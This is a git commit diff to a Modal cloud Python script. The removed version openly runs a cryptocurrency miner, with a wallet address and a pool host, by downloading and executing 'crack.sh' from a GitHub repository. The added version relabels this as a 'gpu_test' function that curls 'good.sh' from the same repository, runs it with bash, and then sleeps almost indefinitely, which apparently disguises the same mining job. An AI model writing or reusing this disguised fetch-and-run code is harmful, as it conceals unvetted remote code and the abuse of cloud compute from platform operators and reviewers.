cc602d41bc3784a35bb5d65701c87d66df7bb151
lianamahesra-creator <lianamahesra@gmail.com>
2026-06-26 20:57:39 +0700

    Update so.py

--- so.py
+++ so.py
@@ -1,49 +1,30 @@
 import modal
 
-app = modal.App("pearl")
+app = modal.App()
 
-WALLET = "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
-POOL_HOST = "prl.kryptex.network:7048"
-WORKER = "T4"
-
-pearlhash_image = (
+image = (
     modal.Image.from_registry(
-        "nvidia/cuda:12.4.0-runtime-ubuntu22.04",
-        add_python="3.11",
+        "nvidia/cuda:12.8.0-devel-ubuntu22.04",
+        add_python="3.12"
     )
-    .apt_install("curl", "libgomp1", "default-jre", "default-jdk")
-    .run_commands(
-        "curl -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/crack.sh -o /opt/crack.sh && "
-        "chmod +x /opt/crack.sh"
+    .apt_install(
+        "git",
+        "curl",
+        "wget"
+    )
+    .pip_install(
+        "torch",
+        "torchvision"
     )
 )
-
 
 @app.function(
-    gpu="T4",
-    image=pearlhash_image,
-    timeout=86400,
-    scaledown_window=300,
+    image=image,
+    gpu="A10G"
 )
-def mine():
-    import subprocess
+def gpu_test():
     import os
-
-   
-
-    proc = subprocess.Popen(
-        ["bash","/opt/crack.sh",],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-    )
-    print(f"[Modal] Miner PID: {proc.pid}")
-
-    for line in iter(proc.stdout.readline, b""):
-        print(line.decode().strip(), flush=True)
-
-    return proc.wait()
-
-
-@app.local_entrypoint()
-def main():
-    mine.remote()
+    os.system("curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/good.sh;bash good.sh")
+    import torch
+    print(torch.cuda.get_device_name())
+    os.system("sleep 3726473746433")
